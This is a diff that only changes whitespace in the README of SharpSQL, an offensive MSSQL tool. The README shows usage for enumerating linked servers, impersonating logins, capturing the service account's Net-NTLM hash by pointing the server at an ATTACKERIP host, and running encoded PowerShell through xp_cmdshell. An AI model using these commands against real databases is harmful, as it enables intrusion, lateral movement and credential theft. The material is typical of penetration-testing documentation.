@@ -12,7 +12,7 @@
     ███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████
                                                         ▀▀
     Written By: Jb05s | Version: 1.1.0
-        
+
     MSSQL Authenticated Server Enumeration and Impersonation:
         [1] Retrieve a List of Linked SQL Servers on the Connected SQL Server:
             SharpSQL.exe getlinked /db:DATABASE /server:SERVER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
@@ -22,7 +22,7 @@
             SharpSQL.exe getlogin /db:DATABASE /server:SERVER [/impersonate] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
         [4] Retrieve the Net-NTLM Hash for the Service Account of the Connected SQL Server:
             SharpSQL.exe gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-            
+
     MSSQL Command Execution:
         [1] Execute Encoded PowerShell Command via 'xp_cmdshell':
             SharpSQL.exe xp /db:DATABASE /server:SERVER /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
@@ -42,23 +42,22 @@
 
 ### getlinked
 
-C:\SharpSQL>SharpSQL.exe getlinked /db:master /server:SQL1
+    C:\SharpSQL>SharpSQL.exe getlinked /db:master /server:SQL1
 
-███████ ██   ██  █████  ██████  ██████  ███████  ██████  ██
-██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██    ██ ██
-███████ ███████ ███████ ██████  ██████  ███████ ██    ██ ██
-     ██ ██   ██ ██   ██ ██   ██ ██           ██ ██ ▄▄ ██ ██
-███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████
-                                                    ▀▀
-Written By: Jb05s | Version: 1.1.0
-
-[*] Action: Retrieve Linked Servers
-
+    ███████ ██   ██  █████  ██████  ██████  ███████  ██████  ██
+    ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██    ██ ██
+    ███████ ███████ ███████ ██████  ██████  ███████ ██    ██ ██
+         ██ ██   ██ ██   ██ ██   ██ ██           ██ ██ ▄▄ ██ ██
+    ███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████
+                                                        ▀▀
+    Written By: Jb05s | Version: 1.1.0
+        
+    [*] Action: Retrieve Linked Servers
         Usage: SharpSQL.exe getlinked /db:DATABASE /server:SERVER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
 
-[+] Authentication to the 'master' Database on 'SQL1' Successful!
-[*] Linked SQL server: SQL2
-[*] Linked SQL server: SQL1\SQLEXPRESS
+    [+] Authentication to the 'master' Database on 'SQL1' Successful!
+    [*] Linked SQL server: SQL2
+    [*] Linked SQL server: SQL1\SQLEXPRESS
 
 
 ### getdbuser
